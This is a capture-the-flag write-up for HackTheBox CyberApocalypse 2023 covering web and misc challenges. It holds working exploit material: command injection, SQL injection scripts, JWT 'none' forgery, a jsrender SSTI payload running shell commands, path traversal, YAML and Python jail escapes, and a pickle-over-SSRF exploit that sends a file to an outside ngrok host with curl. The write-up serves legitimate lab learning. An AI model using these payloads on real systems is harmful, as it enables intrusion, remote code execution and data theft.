---
title: HackTheBox - CyberApocalypse 2023
author: 0
date: 2023-03-23 16:00:00 +0800
categories: [htb, ctf]
tags: [ctf]
render_with_liquid: false

---

## Web - Trapped
View page source
 ```html
 <script>
		window.CONFIG = window.CONFIG || {
			buildNumber: "v20190816",
			debug: false,
			modelName: "Valencia",
			correctPin: "8291",
		}
	</script>
 ```
 HTB{V13w_50urc3_c4n_b3_u53ful!!!}
 
 ## Web - Gunpoint
 `cat ReconModel.php`
```php
<?php
#[AllowDynamicProperties]

class ReconModel
{   
    public function __construct($ip)
    {
        $this->ip = $ip;
    }

    public function getOutput()
    {
        # Do I need to sanitize user input before passing it to shell_exec?
        return shell_exec('ping -c 3 '.$this->ip);
    }
}                                                                                                                                      
```

Exploit Command:
```bash
/ping 1; CAT /flag.txt
 ```
HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}

## Web - drobot
```python
from colorama import Cursor
from application.util import createJWT
from flask_mysqldb import MySQL

mysql = MySQL()

def query_db(query, args=(), one=False):
    cursor = mysql.connection.cursor()
    cursor.execute(query, args)
    rv = [dict((cursor.description[idx][0], value)
        for idx, value in enumerate(row)) for row in cursor.fetchall()]
    return (rv[0] if rv else None) if one else rv


def login(username, password):
    # We should update our code base and use techniques like parameterization to avoid SQL Injection
    user = query_db(f'SELECT password FROM users WHERE username = "{username}" AND password = "{password}" ', one=True)

    if user:
        token = createJWT(username)
        return token
    else:
        return False
```

Use a wordlist for Login bypasses: [login_bypass.txt](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass)

exploit.py
```python
import requests

url = "http://139.59.173.68:30518/api/login"
count = 0
total_lines = sum(1 for line in open('login_bypass.txt'))

def try_authenticate(username, password):
    payload = { "username":username.strip('\n'),"password":password.strip('\n')}
    response = requests.post(url, json=payload)
    print(f"{count}/{total_lines} - {response.status_code} - {payload}")
    if response.status_code == 200:
        return True
    return False

with open("login_bypass.txt") as file:
    for line in file:
        count +=1
        user = try_authenticate(line, "password")
        password = try_authenticate("username", line)
        if user or password:
            break
```

output
``` 
61/804 - 403 - {'username': 'username', 'password': "')) or (('x'))=(('x"}
62/804 - 403 - {'username': '" or "x"="x', 'password': 'password'}
62/804 - 200 - {'username': 'username', 'password': '" or "x"="x'}
```

HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}

## Web - Passman
Helpers/GraphQLHelper.js: No authorisation on the UpdatePassword mutation in GraphQL
```javascript
const mutationType = new GraphQLObjectType({
    name: 'Mutation',
    fields: {
        RegisterUser: {
            type: ResponseType,
            args: {
                email: { type: new GraphQLNonNull(GraphQLString) },
                username: { type: new GraphQLNonNull(GraphQLString) },
                password: { type: new GraphQLNonNull(GraphQLString) }
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    db.registerUser(args.email, args.username, args.password)
                        .then(() => resolve(response("User registered successfully!")))
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },

        LoginUser: {
            type: ResponseType,
            args: {
                username: { type: new GraphQLNonNull(GraphQLString) },
                password: { type: new GraphQLNonNull(GraphQLString) }
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    db.loginUser(args.username, args.password)
                        .then(async (user) => {
                            if (user.length) {
                                let token = await JWTHelper.sign( user[0] );
                                resolve({
                                    message: "User logged in successfully!",
                                    token: token
                                });
                            };
                            reject(new Error("Username or password is invalid!"));
                        })
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },

        UpdatePassword: {
            type: ResponseType,
            args: {
                username: { type: new GraphQLNonNull(GraphQLString) },
                password: { type: new GraphQLNonNull(GraphQLString) }
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    if (!request.user) return reject(new GraphQLError('Authentication required!'));

                    db.updatePassword(args.username, args.password)
                        .then(() => resolve(response("Password updated successfully!")))
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },

        AddPhrase: {
            type: ResponseType,
            args: {
                recType: { type: new GraphQLNonNull(GraphQLString) },
                recAddr: { type: new GraphQLNonNull(GraphQLString) },
                recUser: { type: new GraphQLNonNull(GraphQLString) },
                recPass: { type: new GraphQLNonNull(GraphQLString) },
                recNote: { type: new GraphQLNonNull(GraphQLString) },
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    if (!request.user) return reject(new GraphQLError('Authentication required!'));

                    db.addPhrase(request.user.username, args)
                        .then(() => resolve(response("Phrase added successfully!")))
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },
    }
});
```

```
POST /graphql HTTP/1.1
Host: XXX
User-Agent: XXX
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: XXX
Content-Type: application/json
Origin: XXX
Content-Length: 102
Connection: close
Cookie: XXX
{
"query": "mutation { UpdatePassword(username: \"admin\", password: \"newpassword\") { message } }"
}
```

HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}

## Web - Orbital
database.py
```python
from colorama import Cursor
from application.util import createJWT, passwordVerify
from flask_mysqldb import MySQL

mysql = MySQL()

def query(query, args=(), one=False):
    cursor = mysql.connection.cursor()
    cursor.execute(query, args)
    rv = [dict((cursor.description[idx][0], value)
        for idx, value in enumerate(row)) for row in cursor.fetchall()]
    return (rv[0] if rv else None) if one else rv


def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

    if user:
        passwordCheck = passwordVerify(user['password'], password)

        if passwordCheck:
            token = createJWT(user['username'])
            return token
    else:
        return False

def getCommunication():
    return query('SELECT * from communication')   
```


Using SQLMap against login to dump database:
```sqlmap -r login_request.txt --dbms=mysql --dump```



output
```
Database: orbital                                                                                                                    
Table: users
[1 entry]
+----+-------------------------------------------------+----------+
| id | password                                        | username |
+----+-------------------------------------------------+----------+
| 1  | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin    |
+----+-------------------------------------------------+----------+
``` 
application/blueprint/routes.py
Path traversal in api/export
```python
@api.route('/export', methods=['POST'])
@isAuthenticated
def exportFile():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
    except:
        return response('Unable to retrieve the communication'), 400
```

Dockerfile
We see the flag.txt has been copied to the file ```/signal_sleuth_firmware```
```docker
# copy flag
COPY flag.txt /signal_sleuth_firmware
COPY files /communications/

```

Request to get the flag:
```
POST /api/export HTTP/1.1
Host: XXX
User-Agent: XXX
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
Content-Length: 38
Origin: XXX
Connection: close
Referer: XXX
Cookie: XXX
{
"name":"../signal_sleuth_firmware"
}
```
HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}

## Web - Didactic Octo Paddles

AdminMiddleware.js business logic JWT tokens with another algo then H256 are being processed without token:
```javascript
const jwt = require("jsonwebtoken");
const { tokenKey } = require("../utils/authorization");
const db = require("../utils/database");

const AdminMiddleware = async (req, res, next) => {
    try {
        const sessionCookie = req.cookies.session;
        if (!sessionCookie) {
            return res.redirect("/login");
        }
        const decoded = jwt.decode(sessionCookie, { complete: true });

        if (decoded.header.alg == 'none') {
            return res.redirect("/login");
        } else if (decoded.header.alg == "HS256") {
            const user = jwt.verify(sessionCookie, tokenKey, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res.status(403).send("You are not an admin");
            }
        } else {
            const user = jwt.verify(sessionCookie, null, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res
                    .status(403)
                    .send({ message: "You are not an admin" });
            }
        }
    } catch (err) {
        return res.redirect("/login");
    }
    next();
};

module.exports = AdminMiddleware;
```

Use jwt_tool to tamper with [jwt token](https://github.com/ticarpi/jwt_tool)
```python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5MjM5OTU1LCJleHAiOjE2NzkyNDM1NTV9.dJjAYGyWsqK-8k1PKsQRW74ZFgc6tFquC0oCiKFaFb0 -X a``` 
- Change algo to 'None' to go to the else section of the if statement
```python3 jwt_tool.py eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiaWF0IjoxNjc5MjM5OTU1LCJleHAiOjE2NzkyNDM1NTV9. -T``` 
- Change id to 1 
exploit jwt: ```eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5MjM5OTU1LCJleHAiOjE2NzkyNDM1NTV9.```

request to get /admin
```
GET /admin HTTP/1.1
Host: XXX
User-Agent: XXX
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5MjM5OTU1LCJleHAiOjE2NzkyNDM1NTV9.
Upgrade-Insecure-Requests: 1
```

The web application uses jsrender so there is a possibility of SSTI
Package.json
```yaml
{
    "name": "didactic-octo-paddle",
    "dependencies": {
        "bcryptjs": "^2.4.3",
        "cookie-parser": "^1.4.6",
        "express": "^4.18.2",
        "jsonwebtoken": "^9.0.0",
        "jsrender": "^1.0.12",
        "nodemon": "^2.0.20",
        "path": "^0.12.7",
        "sequelize": "^6.28.0",
        "sqlite3": "^5.1.4"
    }
}
```

The admin dashboard uses the templating engine to print out usernames, so we create a username with an [SSTI exploit](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jsrender-nodejs) for jsrender and refresh the /admin dashboard with our tampered jwt token.
```
POST /register HTTP/1.1
Host: XXX
User-Agent: XXX
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: XXX
Content-Type: application/json
Origin: XXX
Content-Length: 187
Connection: close
Cookie: session=XXX
{"username":"{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()}}","password":"test"}
```

HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}

## Web - TrapTrack
This flask application uses redis with a worker waiting to do a health check on an URL with `PyCurl`. Redis deserialises set through `HSET`. We exploit an insecure deserialization vulnerability by pickling a command to send the flag to our server and execute it on Redis through SSRF.

exploit.py
```python
import requests
import base64
import pickle

victim_url = 'http://209.97.134.50:31920/'
url = 'https://ea58-2a02-a03f-e416-1500-9fe4-ab5f-a6cd-d3a8.eu.ngrok.io'

def payload(cmd):
    class rce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)
    dmp = pickle.dumps(rce())
    return dmp
            


response = requests.post(victim_url + 'api/login', json= {'username':'admin', 'password':'admin'})
print(response.cookies)

pickledPayload = base64.b64encode(payload('/readflag > /tmp/flag; curl -d @/tmp/flag ' + url))
print(f'{pickledPayload=}')

ssrf = 'gopher://127.0.0.1:6379/_' + requests.utils.quote(f"HSET jobs 100 {pickledPayload.decode()}\nSAVE") 
print(ssrf)

response = requests.post(victim_url + 'api/tracks/add', json={'trapName':'SSRF', 'trapURL':ssrf}, cookies=response.cookies) 
print(response.text)
```
HTB{tr4p_qu3u3d_t0_rc3!}

## Misc - Hijack
This challenge is about insecure deserialization in Python. When pickle deserialization happens the reduce method is checked for instructions, we overwrite these to read out the flag file.

1)
exploit.py:
```
import os
import yaml

class Payload(object):
    def __reduce__(object):
        command = 'cat flag.txt'
        return(os.system, (command,))

print(yaml.dump(Payload()))
```

2)
Base64 encode the payload
 `python3 exploit.py | base64`
output
 `ISFweXRob24vb2JqZWN0L2FwcGx5OnBvc2l4LnN5c3RlbQotIGNhdCBmbGFnLnR4dAoK`

3)
Connect to the server with netcat
`nc IP PORT`
select the `Load Config` option
```
<------[TCS]------>
[1] Create config                                                                                                                  
[2] Load config                                                                                                                    
[3] Exit                                                                                                                           
>2
Serialized config to load: ISFweXRob24vb2JqZWN0L2FwcGx5OnBvc2l4LnN5c3RlbQotIGNhdCBmbGFnLnR4dAoK                                    
HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}                                                                                   
** Success **                                                                                                                      
Uploading to ship...
```                                                                                      
                     
HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}

## Misc - Restricted
https://d00mfist.gitbooks.io/ctf/content/escaping_restricted_shell.html

`ssh restricted@104.248.169.117 -p 31231`

Once inside the instance you have a very restricted profile that doesn't allow any slashes, `cd`,`su`,`id`,`ls`,`python`..
You can however do `export -p` 

We know from the source code there is an entry listening on port 1337 you can connect to it by using ssh with "bash noprofile" to bypass the restricted bash profile:
`ssh restricted@10.244.5.144 -p 1337 "bash --noprofile"`

`pwd`
/home/restricted

`id`
uid=1000(restricted) gid=1000(restricted) groups=1000(restricted)

`cd /`

`ls`

`cat flag_8dpsy`

HTB{r35tr1ct10n5_4r3_p0w3r1355}


## Misc - nehebkaus trap

This challenge is about Python Jailbreak escape.
Denylisted characters:
`Blacklisted character(s): ['.', '_', '"', ' ', "'", ',']`
Allowed characters:
`(`
`)`
`+`
`aZ`

There are two methods that I discovered to complete this challenge

### Invoking `input()`
```
    __
   {00}                                                                                                                                
   \__/                                                                                                                                
   /^/                                                                                                                                 
  ( (                                                                                                                                  
   \_\_____                                                                                                                            
   (_______)                                                                                                                           
  (_________()Ooo.                                                                                                                                                                                                                                       
[ Nehebkau's Trap ]                                                                                                                                                                                                                                          
You are trapped!                                                                                                                       
Can you escape?                                                                                                                        
> print(eval(input()))                                                                                                                                                                                                                                     
[*] Input accepted!                                                                                                                                                                                                                                          
__import__('os').system('cat flag.txt')                                                                                                
HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}
```

### Converting to ascii
1)
In this case, we used `int(open("flag.txt", "r").read())` to get the flag, but any command could be used. We need to encapsulate this command with `int()` to provoke an error as this allows us to view the flag
convert the command to read the file to ascii 
convert.py:
```
command = 'int(open("flag.txt", "r").read())'
output = ''
for i in range(len(command)):
    output += 'chr(' + str(ord(command[i])) + ')+'
print(output)
```

2)
run `eval` with the converted char string
```
>eval(chr(105)+chr(110)+chr(116)+chr(40)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)+chr(39)+chr(44)+chr(32)+chr(39)+chr(114)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(41))
[*] Input accepted!
Error: invalid literal for int() with base 10: 'HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}\n'
```
HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}

## Misc - Janken

There is a logic bug in the code, submitting "rockpaperscissors" will always pass.

```python
from socket import socket

def sendInput(input):
    sock.send(input.encode())
    return sock.recv(1024).decode()

output = ''
sock = socket()
sock.connect(('167.99.86.8', 30479))
#start the game
sendInput('1')
#submitting "rockpaperscissors" each round
for i in range(100):
    output = sendInput('rockpaperscissors')
    print(output)
```

```
[*] Round [99]:                                                                                                                       
                                                                                                                                      
Choose:                                                                                                                               
                                                                                                                                      
Rock 👊                                                                                                                               
Scissors ✂                                                                                                                            
Paper 📜                                                                                                                              
                                                                                                                                      
>>                                                                                                                                    
                                                                                                                                      
[!] Guru's choice: rock                                                                                                               
[!] Your  choice: rockpaperscissors                                                                                                   
[+] You won this round! Congrats!                                                                                                     
[+] You are worthy! Here is your prize: HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}  
```
HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}  
